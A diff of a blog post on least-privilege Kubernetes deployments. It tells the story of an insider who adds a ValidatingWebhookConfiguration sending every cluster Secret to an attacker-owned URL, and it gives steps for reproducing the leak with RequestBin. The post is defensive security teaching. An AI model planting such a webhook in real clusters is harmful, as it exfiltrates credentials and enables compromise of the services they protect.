@@ -1,9 +1,9 @@
 ---
 title: "Least Privilege Deployments in Kubernetes" # Title of the blog post.
 date: 2023-02-24T16:19:09-06:00 # Date of post creation.
-description: "Article description." # Description used for search engine.
+description: "Least privilege deployment in Kubernetes" # Description used for search engine.
 featured: true # Sets if post is a featured post, making appear on the home page side bar.
-draft: true # Sets whether to render this page. Draft of true will not be rendered.
+draft: false # Sets whether to render this page. Draft of true will not be rendered.
 toc: false # Controls if a table of contents should be generated for first-level links automatically.
 # menu: main
 usePageBundles: true # Set to true to group assets like images in the same folder as this post.
@@ -27,7 +27,7 @@ tags:
 
 Many things in security tend to come down to the same few concepts, one of the most important being to limit the surface area of attack. The [principle of least privilege](https://en.wikipedia.org/wiki/Principle_of_least_privilege) is the idea that we should design our operations to use only the minimal set of permissions required to accomplish the task. When deploying applications in Kubernetes, this usually means making use of multiple personas for the deployment of different resources. (This concept applies to running applications as well, but that's a discussion for a different time.)
 
-Many production Kubernetes clusters, even if used to host a single app, require deploying prequisites that may need to create cluster-level resources, such as [`CustomResourceDefinitions`](https://kubernetes.io/docs/tasks/extend-kubernetes/custom-resources/custom-resource-definitions/) or perhaps even `ClusterRole` and `ClusterRoleBinding` objects. These types of resources usually require a cluster administrator to deploy, because they have an effect broadly across the entire cluster. For convenience, many teams may be tempted to use this elevated permission set to deploy *everything* using that same persona. After all, who wants to deal with two (or more!) service principals in their pipelines? That's just too much work, and we've got a deadline to meet!
+Many production Kubernetes clusters, even if used to host a single app, require deploying prequisites that may need to create cluster-level resources, such as [`CustomResourceDefinitions`](https://kubernetes.io/docs/tasks/extend-kubernetes/custom-resources/custom-resource-definitions/) or perhaps even `ClusterRole` and `ClusterRoleBinding` objects. These types of resources typically require a cluster administrator (or RBAC-equivalent) account to deploy, because they have an effect broadly across the entire cluster. For convenience, many teams may be tempted to use this elevated permission set to deploy *everything* to the cluster. After all, who wants to deal with two (or more!) service principals in their pipelines? That's just too much work, and we've got a deadline to meet!
 
 The danger here is that the more things you deploy, the less certainty you'll generally have of the content. Let's consider an example.
 
@@ -64,11 +64,43 @@ webhooks:
       url: "https://wizabin.validateya.ml/validator"
 ```
 
-Frank and Ben (another engineer on the team) review Scott's PR. They question the `ValidatingWebhookConfiguration` resource, having only seen things like `Deployments` and `Services` and the like. But Scott's the Kubernetes *expert*, and to a novice, anything labeled as "security" must be a good thing, right? So the PR gets approved, and later deployed to production.
+Frank and Ben (another engineer on the team) review Scott's PR. They question the `ValidatingWebhookConfiguration` resource, having only seen things like `Deployment` and `Service` resources and the like. But Scott's the Kubernetes *expert*, and to a novice, anything labeled as "security" must be a good thing, right?[^3] So the PR gets approved, and later deployed to production.
 
 A few weeks later, Scott gets an offer from another company, and leaves the team. Jim, the project manager, decides to throw a farewell party as a thanks for all Scott has contributed to the team. They'd never have made it to version 2.0 of the platform without his expertise in Kubernetes. Cake is eaten, handshakes and high-fives are exchanged, and Scott drives off at the end of the day.
 
-...
+...you probably see where this is heading.
 
-[^1]: totally fake name generated via [this tool](https://fauxid.com/tools/fake-company-generator?country=united-states&count=10)
+A few weeks later, the team notices that some of their payment processor accounts have some discrepancies. Customers are calling in with complaints. Some of their SaaS based accounts seem to be compromised. In short, *everything* has gone wrong. So what happened?
+
+As it turns out, Scott was the owner of the `validateya.ml` domain in the `ValidatingWebhookConfiguration`, and that resource has the effect of sending the entire contents of any `Secret` object created or updated in the cluster to the `https://wizabin.validateya.ml/validator` URL. All he had to do was sit back and wait for the secrets to all manner of resources came rolling in, at which point he could compromise services at his leisure, wreaking all sorts of havoc against his former employer.
+
+`ValidatingWebhookConfiguration` resources are *not intrinsically unsafe*. Most often, they're used to validate policy against incoming resources, and are usually deployed as resources inside the cluster rather than as external resources like we've shown here. [OPA Gatekeeper](https://open-policy-agent.github.io/gatekeeper/website/docs/) and [Kyverno](https://kyverno.io/) are two such tools for doing this sort of policy enforcement. The danger of insider threat is not the only way such a vulnerability could manifest either. Are you certain that you can trust any externally sourced applications or Helm charts that you deploy alongside your app? (Think databases, logging utilities, service meshes, etc.) What if they got unknowingly compromised? Supply chain attacks are certainly a risk here, which is why I'll reiterate my stance that "the more things you deploy, the less certainty you'll generally have about the content", especially when using accounts with elevated privileges to do the deployments.
+
+If you'd like to try something similar for yourself[^4], head on over to [PipeDream's RequestBin](https://pipedream.com/requestbin) to create a unique URL that you can use to view incoming requests via your browser. Then change lines 6 and 17 in the YAML above to include that custom URL. Once done, use the following command to deploy a sample secret to your cluster (or create your own).
+
+```bash
+kubectl create secret generic db-user-pass \
+    --from-literal=username=admin \
+    --from-literal=password='S!B\*d$zDsb='
+```
+
+You should be able to see the request come in, which will look something like this:
+
+![RequestBin UI showing Kubernetes secret in base64](request-bin-secret.png)
+
+Decode the two `data` objects from base64 to roundtrip the contents of the secret.
+
+```bash
+echo 'YWRtaW4=' | base64 -d  # returns admin
+echo 'UyFCXCpkJHpEc2I9' | base64 -d  # returns S!B\*d$zDsb=
+```
+
+The takeaway from this story should be this: be certain to critically review *anything* that gets deployed using a cluster admin level account. Limit the resources that you deploy using it, and use less privileged accounts with just enough RBAC privileges assigned to get the job done for the rest of your deployments. There are other mitigations that can help these scenarios as well, most notably restricting network egress from the cluster using a firewall or other network security policy. We'll dive more into that setup in a future post.
+
+Until then, I'll invite you to view the presentation from [Ian Coldwater](https://twitter.com/IanColdwater) and [Brad Geesaman](https://twitter.com/bradgeesaman) that inspired this post, which has demos of the above exploit and more.
+{{< youtube JBbVTmrZ45E >}}
+
+[^1]: totally fake company name generated via [this tool](https://fauxid.com/tools/fake-company-generator?country=united-states&count=10)
 [^2]: perceptive readers will have already done the math here. [Kubernetes 1.0 was released on July 21, 2015...](https://en.wikipedia.org/wiki/Kubernetes#History)
+[^3]: another fun naming strategy might be to call this resource the `secrets-disaster-recovery-plan`
+[^4]: please don't do this on a production cluster! 😊
